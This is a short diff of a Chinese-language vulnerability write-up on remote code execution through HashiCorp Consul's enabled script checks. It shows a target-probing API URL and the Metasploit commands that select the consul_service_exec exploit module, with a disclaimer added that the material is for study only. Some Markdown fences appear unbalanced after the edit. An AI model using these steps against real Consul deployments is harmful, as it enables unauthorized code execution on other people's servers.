@@ -47,11 +47,14 @@ consul.exe agent -dev -client <your-target-ip>  -enable-script-checks
 
 ```
 http://your-target-ip:port/v1/agent/self
-```
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
 
-也可以使用Meterpreter进行利用：
+<pre><code class="language-text">
+也可以使用&#77;eterpreter进行利用：
+</code></pre>
 
-```
+</details>
 msf6 > search Hashicorp
 msf6 > use exploit/multi/misc/consul_service_exec
 ```
